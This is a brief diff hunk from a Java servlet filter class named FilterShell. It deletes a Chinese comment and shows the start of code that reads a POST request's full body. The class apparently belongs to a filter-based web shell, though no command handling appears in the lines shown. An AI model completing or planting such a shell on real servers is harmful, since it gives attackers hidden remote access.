@@ -74,7 +74,6 @@ public class FilterShell implements javax.servlet.Filter {
 
         if (request.getMethod().equalsIgnoreCase("POST")) {
             try {
-                // 1. 全量讀取請求資料
                 ByteArrayOutputStream bos = new ByteArrayOutputStream();
                 InputStream isClient = request.getInputStream();
                 byte[] buf = new byte[512];
